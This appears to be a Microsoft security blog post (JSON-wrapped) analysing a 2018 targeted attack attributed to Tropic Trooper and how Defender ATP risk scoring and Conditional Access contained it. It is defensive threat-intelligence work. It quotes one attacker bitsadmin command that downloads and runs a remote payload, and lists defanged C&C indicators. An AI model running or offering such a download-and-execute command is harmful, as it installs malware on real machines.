{
    "title": "windows defender atp device risk score exposes new cyberattack_ drives conditional access to protect networks - microsoft security",
    "text": "Several weeks ago, the Windows Defender Advanced Threat Protection ﴾ Windows Defender ATP  ﴿team\nuncovered a new cyberattack that targeted several high‐profile organizations in the energy and food and\nbeverage sectors in Asia. Given the target region and verticals, the attack chain, and the toolsets used, we\nbelieve the threat actor that the industry refers to as Tropic Trooper was likely behind the attack.\nThe attack set off numerous Windows Defender ATP alerts and triggered the device risk calculation\nmechanism, which labeled the affected machines with the highest risk. The high device risk score put the\naffected machines at the top of the list in Windows Defender Security Center, which led to the early\ndetection and discovery of the attack.\nWith the high risk determined for affected machines, Conditional access  blocked these machines’ access\nto sensitive content, protecting other users, devices, and data in the network. IT admins can control\naccess with Conditional access based on the device risk score to ensure that only secure devices have\naccess to enterprise resources.\nFinally, automatic investigation and remediation kicked in, discovered the artifacts on affected machines\nthat were related to the breach, and remediated the threat. This sequence of actions ensured that the\nattackers no longer had foothold on affected machines, returning machines to normal working state.\nOnce the threat was remediated, the risk score for those machines was reduced and Conditional access\nrestrictions were lifted.\nInvestigating alert timelines and process\ntrees\nWe discovered the attack when Windows Defender ATP called our attention to alerts flagging several\ndifferent suspicious activities like abnormal Office applications activity, dubious cross‐process injections,\nand machine‐learning‐based indications of anomalous executions flows. The sheer volume and variety of\nthe alerts told us something serious was going on.\nFigure 1. Multiple alerts triggered by the attack\nThe first detection related to the attack was fired by a suspicious EQNEDT32.exe  behavior, which led us to\nthe entry vector of the attack: a malicious document that carried an exploit for CVE‐2018‐0802, a\nvulnerability in Microsoft Office Equation Editor, which the actor known as Tropic Trooper has exploited in\nprevious campaigns. Using Office 365  ATP Threat Explorer, we found the specific emails that the attackers\nused to distribute the malicious document.\nUsing Windows Defender Security Center, we further investigated the detected executable and found that\nthe attackers used bitsadmin.exe  to download and execute a randomly named payload from a remote\nserver:\nbitsadmin /transfer Cd /priority foreground http:/<IP address>:4560/.exe %USERPROFILE%\\\nfY.exe && start %USERPROFILE%\\fY.exe\nMachine timeline activity showed that the executed payload communicated to a remote command‐and‐\ncontrol ﴾C&C ﴿server and used the process hollowing  technique to run code in a system process memory.\nIn some cases, the attacker ran additional activities using malicious PowerShell scripts. Windows Defender\nATP’s Antimalware Scan Interface ﴾AMSI﴿  sensor exposed all the attacker scripts, which we observed to be\nmeant mostly for data exfiltration.\nFigure 2. Process tree\nUsing the timeline and process tree views in Windows Defender Security Center, were able to identity the\nprocesses exhibiting malicious activities and pinpoint exactly when they occurred, allowing us to\nreconstruct the attack chain. As a result of this analysis, we were able to determine a strong similarity\nbetween this new attack and the attack patterns used by the threat actor known as Tropic Trooper.\nFigure 3. Campaign attack chain\nDevice risk calculation and incident\nprioritization\nThe alerts that were raised for this attack resulted in a high device risk score for affected machines.\nWindows Defender ATP determines a device risk score based on different mechanisms. The score is\nmeant to raise the risk level of machines with true positive alerts that indicate a potential targeted attack.\nThe high device risk score pushed the affected machines to the top of the queue, helping ensure security\noperations teams can immediately notice and prioritize. More importantly, elevated device risk scores\ntrigger automatic investigation and response, helping contain attacks early in its lifespan.\nIn this specific attack, the risk calculation mechanism gave the affected machines the highest risk based\non cumulative risk. Cumulative risk is calculated based on the multiple component and multiple types of\nanomalous behaviors exhibited by an attack across the infection chain.\nWindows Defender ATP‐driven\nconditional access\nWhen Windows Defender ATP raises the device risk score for machines, as in this attack, the affected\ndevices are marked as being at high risk. This risk score is immediately communicated to Conditional\naccess, resulting in the restriction of access from these devices to corporate services and data managed\nby Azure Active Directory .\nThis integration between Windows Defender ATP and Azure Active Directory through Microsoft Intune\nensures that attackers are immediately prevented from gaining access to sensitive corporate data, even if\nattackers manage to establish a foothold on networks. When the threat is remediated, Windows\nDefender ATP drops the device risk score, and the device regains access to resources. Read more about\nConditional access here .\nSignal sharing and threat remediation\nacross Microsoft Threat Protection\nThreat signal sharing across Microsoft services through the Intelligent Security Graph  ensures that threat\nremediation is orchestrated across Microsoft Threat Protection . In this case, Office 365  ATP blocked the\nrelated email and malicious document used in the initial stages of the attack. Office 365  ATP had\ndetermined the malicious nature of the emails and attachment at the onset, stopping the attack’s entry\npoint and protecting Office 365  ATP customers from the attack.\nThis threat signal is shared with Windows Defender ATP, adding to the rich threat intelligence that was\nused for investigation. Likewise, Office 365  ATP consumes intelligence from Windows Defender ATP,\nhelping make sure that malicious attachments are detected and related emails are blocked.\nMeanwhile, as mentioned, the integration of Windows Defender ATP and Azure Active Directory ensured\nthat affected devices are not allowed to access sensitive corporate data until the threat is resolved.\nWindows Defender ATP, Office 365  ATP, and Azure Active Directory are just someof the many Microsoft\nservices now integrate through Microsoft Threat Protection, an integrated solution for securing identities,\nendpoints, user data, cloud apps, and infrastructure.\nConclusion\nThe new device risk calculation mechanism in Windows Defender ATP  raised the priority of various alerts\nthat turned out to be related to a targeted attack, exposing the threat and allowing security operations\nteams to immediately take remediation actions. Additionally, the elevated device risk score triggered\nautomated investigation and response, mitigating the attack at its early stages.\nThrough Conditional access , compromised machines are blocked from accessing critical corporate assets.\nThis protects organizations from the serious risk of attackers leveraging compromised devices to perform\ncyberespionage and other types of attacks.\nTo test how these and other advanced capabilities in Windows Defender ATP can help your organization\ndetect, investigate, and respond to attacks, sign up for a free trial .\n \n \nHadar Feldman  and Yarden Albeck\nWindows Defender ATP team\n \n \nIndicators of attack ﴾IoCs﴿\nCommand and control IP addresses and URLs:\n199[.]192[.]23[.]231\n45[.]122[.]138 [.]6\nlovehaytyuio09[.]com\nFiles ﴾SHA‐256:﴿\n9adfc863501b4c502fdac0d97e654541c7355316f1d1663b26a9aaa5b5e722d6 ﴾size: 190696\nbytes, type: PE﴿\n5589544be7f826df87f69a84abf478474b6eef79b48b914545136290fee840fe ﴾size: 727552, type:\nPE﴿\n073884caf7df8dafc225567f9065bbf9bf8e5beef923655d45fe5b63c6b6018c ﴾size: 195123 bytes,\ntype: docx﴿\n1aef46dcbf9f0b5ff548f492685d488c7ac514a24e63a4d3ed119bfdbd39c908 ﴾size: 207444, type:\ndocx﴿\n \n \n \nTalk to us\nQuestions, concerns, or insights on this story? Join discussions at the Microsoft community  and Windows\nDefender Security Intelligence .\nFollow us on Twitter @WDSecurity  and Facebook Windows Defender Security Intelligence .\n \nFiled under:\nAI and machine learning , Compliance , Cybersecurity , Microsoft Intelligent Security Graph , Microsoft Intune ,\nOffice 365  Security , Secure Score , Windows Security\nGet started with Microsoft Security\nMicrosoft is a leader in cybersecurity, and we embrace our responsibility to\nmake the world a safer place.\n \nWhat's new\nSurface Pro X\nSurface Laptop 3\nSurface Pro 7\nWindows 10 apps\nOffice appsMicrosoft Store\nAccount profile\nDownload Center\nMicrosoft Store support\nReturns\nOrder tracking\nStore locations\nBuy online, pick up in store\nIn‐store eventsEducation\nMicrosoft in education\nOffice for students\nOffice 365  for schools\nDeals for students & parents\nMicrosoft Azure in educationEnterprise\nAzure\nAppSource\nAutomotive\nGovernment\nHealthcare\nManufacturing\nFinancial services\nRetailDeveloper\nMicrosoft Visual Studio\nWindows Dev Center\nDeveloper Network\nTechNet\nMicrosoft developer program\nChannel 9\nOffice Dev Center\nMicrosoft GarageCompany\nCareers\nAbout Microsoft\nCompany news\nPrivacy at Microsoft\nInvestors\nDiversity and inclusion\nAccessibility\nSecurity\nEnglish ﴾United States﴿ Sitemap  Contact Microsoft  Privacy & cookies  Terms of use  Trademarks  Safety & eco  About our ads  © Microsoft 2020You may also like these articles\nGet all the news, updates, and more at @MSFTSecurityLearn more  This site uses cookies for analytics, personalized content and ads. By continuing to browse this site, you agree to this use.\n     Sign in |Security Search  \nNovember 28, 2018\nWindows Defender ATP device risk score exposes\nnew cyberattack, drives Conditional access to\nprotect networks\nMicrosoft Defender ATP Team\nRead more \nRead more \nRead more \nLEARN MORE Solutions  Products  Operations & Intelligence  Partners  Resources  Trust Center  All Microsoft \n "
}